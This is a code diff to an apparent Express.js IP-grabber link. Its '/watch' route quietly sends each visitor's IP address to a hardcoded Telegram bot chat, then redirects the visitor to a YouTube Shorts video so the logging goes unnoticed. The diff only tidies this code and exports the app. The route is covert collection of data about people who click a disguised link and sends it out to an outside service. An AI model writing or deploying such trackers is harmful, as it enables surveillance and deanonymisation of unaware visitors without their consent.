@@ -6,15 +6,16 @@ const CHAT_ID = '6630829302';
 
 app.get('/watch', async (req, res) => {
     try {
-        const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         const message = `🎯 تم رصيد زيارة جديدة!\n🌐 الـ IP: ${visitorIp}`;
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-        await fetch(url);
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        
+        await fetch(telegramUrl);
     } catch (error) {
-        console.log('Error sending to telegram:', error);
+        console.error('Error:', error);
     }
+    
     res.redirect('https://youtube.com/shorts/bN9h2oRnLB4?si=kXhF5Q_P-ER2yazA_ID');
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
+module.exports = app;
